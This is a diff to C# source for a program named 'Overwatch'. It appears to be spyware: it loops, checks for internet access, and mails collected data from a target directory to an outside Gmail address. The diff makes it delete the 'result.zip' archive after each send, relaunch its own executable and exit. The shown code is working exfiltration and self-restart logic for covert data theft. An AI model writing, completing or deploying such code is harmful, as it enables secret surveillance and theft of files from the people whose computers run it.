@@ -2,6 +2,8 @@
 using System.Net;
 using System.Net.Mail;
 using System.IO;
+using System.Reflection;
+using System.Diagnostics;
 
 namespace Overwatch
 {
@@ -14,10 +16,12 @@ namespace Overwatch
             {
                 while (true)
                 {
-                    cThread.sending = true;
                     System.Threading.Thread.Sleep(60000);
+                    
                     if (ConnectivityChecker.CheckInternet() == true)
                     {
+                        cThread.sending = true;
+                        System.Threading.Thread.Sleep(60000);
                         using (MailMessage mail = new MailMessage())
                         {
                             mail.From = new MailAddress("isthechastener@gmail.com");
@@ -38,7 +42,9 @@ namespace Overwatch
                             }
                         }
                         cThread.sending = false;
-                        cMain.Thread();
+                        cReceiveInformation.DeleteFile(appConfing.targetDirPath + "\\result.zip");
+                        Process.Start(Assembly.GetExecutingAssembly().Location);
+                        Environment.Exit(0);
                     }
                 }
             }
